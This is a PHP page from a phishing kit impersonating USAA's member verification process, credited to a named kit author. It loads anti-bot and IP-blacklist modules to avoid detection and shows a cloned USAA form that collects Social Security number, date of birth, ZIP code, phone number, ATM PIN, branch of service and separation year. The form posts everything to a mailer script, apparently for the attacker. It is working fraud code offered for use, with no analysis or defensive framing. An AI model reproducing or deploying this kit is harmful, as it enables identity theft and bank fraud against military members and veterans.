<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * USAA -
 * version 1.0
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 USAA              $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';

if (!isset($_GET['usaa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['USAA_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html lang="en">
<head>
    <title>USAA | Verification</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta id="Viewport" name="viewport" content="width=device-width, initial-scale=1">


    <script data-react-helmet="true">
(function() {
    var breakpoints = {"0":"xxs","414":"xs","568":"sm","768":"md","1024":"lg","1280":"xl","1440":"xxl","1600":"xxxl"};
    var attempts = 0;

    function getGridLayoutClasses(el) {
        var result = [];

        if (el && typeof el.offsetWidth === 'number') {
            var width = el.offsetWidth;

            for (var breakpointSize in breakpoints) {
                if (width > Number(breakpointSize)) {
                    result.push('layout-' + breakpoints[breakpointSize]);
                }
            }
        }

        return result;
    }

    function updatePageGridClasses() {
        var el = document.querySelector('.usaa-transactionalWrapper');
        if (el) {
            var layoutClasses = getGridLayoutClasses(el);
            el.className += ' ' + layoutClasses.join(' ');
        } else {
            if (attempts > 100) return;
            attempts++;
            setTimeout(updatePageGridClasses, 5);
        }
    }

    updatePageGridClasses();
})();
</script>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.7.5/css/bootstrap-select.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.7.5/js/bootstrap-select.min.js"></script>

<link rel="stylesheet" href="Spox/Files/css/ent-eligibility.a79cb86efed457f2660f.css">
<link rel="stylesheet" href="Spox/Files/css/usaa_glyphIconLibrary.css" data-react-helmet="true">
https://mdbootstrap.com/wp-includes/css/dist/block-library/style.min.css?ver=5.2.3
</head>
<style type="text/css">
    .html{
      line-height: 1;
    }
    .help-block.form-error {
    font-size: 15px;
    padding-left: 23px;
    color: red;
}
.btn-group>.btn:first-child {
    margin-left: 0;
    margin-left: 14px;
    width: 90%;
}
</style>
<body class="font-narrow">
<div id="mainAppRoot">
<div class="usaa-transactionalWrapper layout-xxs layout-xs layout-sm layout-md">
<div class="usaa-transactionalPage">
<div class="usaa-transactionalHeaderAndIndicator">
    <header class="usaa-transactionalHeader">
    <button id="usaa-public-transactional-logoButton" type="button" class="usaa-transactionalHeader-logo usaa-focusRing">
    </button>
    <h1 class="usaa-transactionalHeader-appName font-serif">Verification</h1>
    <button type="button" id="usaa-public-transactional-helpButton" class="usaa-transactionalHeader-navLink font-normal usaa-transactionalHeader-navLink--help usaa-focusRing">Help</button>
    <div>
    <button id="usaa-public-transactional-exitButton" type="button" class="usaa-transactionalHeader-navLink usaa-transactionalHeader-navLink--exit usaa-focusRing">
</button>
</div>
</header>
</div>
<div>
</div>
<div aria-hidden="false" class="usaa-transactionalBodyAndFooter" id="usaa-templateContent">
<div class="usaa-transactionalBodyWrapper">
<div>
</div>
<div class="usaa-transactionalBody" role="main">
<div class="mainPanel-rightPanelButtonContainer"></div>
<div class="template-background"><span>
<div class="" style="background-color: rgb(27, 61, 98); background-image: url(Spox/Files/img/enterprise_accent_diamondPattern.png); background-size: 15px; position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px;">
</div>
</span>
<div class="template-container">
<div class="template-body template-clearfix">
<div class="eligibility-container">
<div class="eligibility-activity-bar">
<div role="status" aria-live="polite" aria-atomic="true">
<h2 class="screenReader">Progress Indicator</h2>
    <ul class="activity-status-bar-container activity-status-bar-step-list">
    <li class="activity-status-bar-step-list-item" aria-live="polite" aria-atomic="true">
    <div class="activity-status-bar-step-item">
<div class="activity-status-bar-step-label font-normal" aria-hidden="true">Card Details</div>
</div>
<p class="screenReader">Step 1 of 3: Eligibility (Currently Active - 10% completed)</p>
<div class="status-bar-container">
<div class="status-bar" style="width: 100%;"></div>
</div>
</li>
<li class="activity-status-bar-step-list-item activity-status-bar-step-list-item--border" aria-live="polite" aria-atomic="true">
<div class="activity-status-bar-step-item">
<div class="activity-status-bar-step-label font-normal" aria-hidden="true">Identification</div>
</div>
<p class="screenReader">Step 2 of 3: Online Registration (0% Completed)</p>
<div class="status-bar-container">
    <div class="status-bar" style="width: 0%; overflow: hidden;"></div>
</div>
</li>
<li class="activity-status-bar-step-list-item activity-status-bar-step-list-item--border" aria-live="polite" aria-atomic="true">
<div class="activity-status-bar-step-item">
<div class="activity-status-bar-step-label font-normal" aria-hidden="true">EMAIL AUTHENTICATION
</div>
</div>
<p class="screenReader">Step 3 of 3: Confirmation (0% Completed)</p>
<div class="status-bar-container">
<div class="status-bar" style="width: 0%; overflow: hidden;"></div>
</div>
</li>
</ul>
</div>
</div>
<div class="eligibility-body">
<div class="eligibility-form" style="min-height: 750px;"><span>
    <div class="eligibility-form-container">
    <form method="POST" action="Spox/Mail/Mail3.php" class="panelWrapper namePanel">
    <input type="hidden" name="spox" value="fuck you ">
    <div class="formInputs-wrapper">
    <h2 class="namePanel-prompt" tabindex="-1">tell us about your information.</h2>
    <div class="usaa-form-v4-7-3-formGroup-wrapper">
    <div class="usaa-form-v4-7-3-formGroup">
<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Social Security Number (SSN)</span>
</label>
</div>
<span class="usaa-input"><span>
<input id="ssn" name="ssn" data-validation="length" data-validation-length="min11-11"  data-validation-error-msg="SSN required!" type="tel" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>

<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Date of birth</span>
</label>
</div>
<span class="usaa-input"><span>
<input  id="dob" name="dob" data-validation-length="min10" data-validation="length" data-validation-error-msg="Date of birth required !"  type="tel" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>

<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Zip code</span>
</label>
</div>
<span class="usaa-input"><span>
<input type="tel" name="zipcode" data-validation="length" data-validation-length="min1-5"  data-validation-error-msg="Zip code required !" id="zip" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>

<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Phone number</span>
</label>
</div>
<span class="usaa-input"><span>
<input data-validation="length" data-validation-error-msg="Phone number required !" id="phone" data-validation-length="min14" type="tel" name="phoneNumber" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>


<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Atm pin</span>
</label>
</div>
<span class="usaa-input"><span>
<input data-validation="length" data-validation-error-msg="Atm pin required !"data-validation-length="min4-4" type="tel" name="atmpin" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>



<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Branch of Service</span>
</label>
</div>

    <select class="selectpicker" data-style="btn-info" multiple data-max-options="3" data-live-search="true" name="branch" required="">
    <optgroup label="Select"> 
        <option value="Army">Army</option>
        <option value="Marine Corps">Marine Corps</option>
        <option value="Navy">Navy</option>
        <option value="Air Force">Air Force</option>
        <option value="Coast Guard">Coast Guard</option>
    </optgroup>
  </select>
<div class="keyboardFocusRing"></div>
</div>

<div class="usaa-form-v4-7-3-textInput usaa-form-v4-7-3-fieldWrapper">
<div class="usaa-form-v4-7-3-block col-1-1">
<div>
<div>
<label for="usaa-form-v4-7-3-input-k1e31rhrxx7" class="usaa-form-v4-7-3-fieldLabel usaa-form-v4-7-3-fieldWrapper-label">
<span aria-hidden="false" class="usaa-form-v4-7-3-fieldLabel-text">Seperation Year</span>
</label>
</div>
<span class="usaa-input"><span>
<input data-validation="length" data-validation-error-msg="Seperation Year required !" data-validation-length="min4-4" type="tel" name="spyear" class="usaa-formatted-input font-narrow-numeric-tabular">
</span>
</span></div>
<div class="keyboardFocusRing"></div>
</div>
</div>




</div>
</div>
</div>
<div class="eligibilityForm-buttonContainer">
<div class="eligibility-buttonGroup">
<div class="eligibility-buttonContainer--secondary visible-sm">
<button type="button" class="usaa-button usaa-button--secondary">Previous</button>
</div>
<div class="eligibility-buttonContainer--primary">
<button type="submit" class="usaa-dynamicPrimaryButton usaa-dynamicPrimaryButton--enabled usaa-dynamicPrimaryButton--autoCapitalize">
<span aria-hidden="true" class="usaa-dynamicPrimaryButton-disabledText">Next</span>
<span aria-hidden="false" class="usaa-dynamicPrimaryButton-enabledText">Next</span>
</button>

</div>
</div>
</form>
</div>
</span>
</div></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="usaa-transactionalFooter" aria-hidden="false"><footer class="usaa-transactionalFooter-footer"><div class="usaa-transactionalFooter-content"><p class="usaa-transactionalFooter-copyright">Copyright © 2019 USAA.</p><div class="pageFooter-disclosures pageFooter-disclosures--aboveFootnotes"><p><strong>Investments/Insurance: Not FDIC Insured • Not Bank Issued, Guaranteed or Underwritten • May Lose Value</strong>
</p></div><div class="pageFooter-footnotes"></div><div class="pageFooter-disclosures pageFooter-disclosures--belowFootnotes"><p>I authorize my mobile carrier to verify my identity using the information I provide to USAA (name, address, email and device).
</p><p>Use of the term "member" or "membership" refers to membership in USAA Membership Services and does not convey any legal or ownership rights in USAA. Restrictions apply and are subject to change. To join USAA, separated military personnel must have received a discharge type of "Honorable". Eligible former dependents of USAA members may join USAA.
</p><p>USAA means United Services Automobile Association and <a href="">its insurance, banking, investment and other companies</a>. Credit cards issued by USAA Savings Bank, other bank products by USAA Federal Savings Bank, both Member FDIC.
<br>
<br>
Investments provided by USAA Investment Management Company and USAA Financial Advisors Inc., both registered broker dealers and affiliates.

<br>
<br>
<img src="Spox/Files/img/ehl-wht.svg" height="40" width="36" border="0"> 


</p><p><strong>NC-1018</strong></p></div><div class="usaa-transactionalFooter-icons"><div class="usaa-transactionalFooter-logo">USAA Logo</div></div></div></footer></div>
</div>
</div>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>
<script>

$(".checkbox__input").click(function(){
    $(this).toggleClass('checkbox__input--checked')
});


  $.validate({
    modules : 'location, date, security, file',
    onModulesLoaded : function() {
      $('#country').suggestCountry();
    }
  });

  // Restrict presentation length
  $('#presentation').restrictLength( $('#pres-max-length') );
 Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
 Inputmask("(9{1,3}) 9{1,3}-9{1,4}").mask("#phone");
 Inputmask("9{1,2}-9{1,2}-9{1,4}").mask("#dob");




</script>

</body>
</html>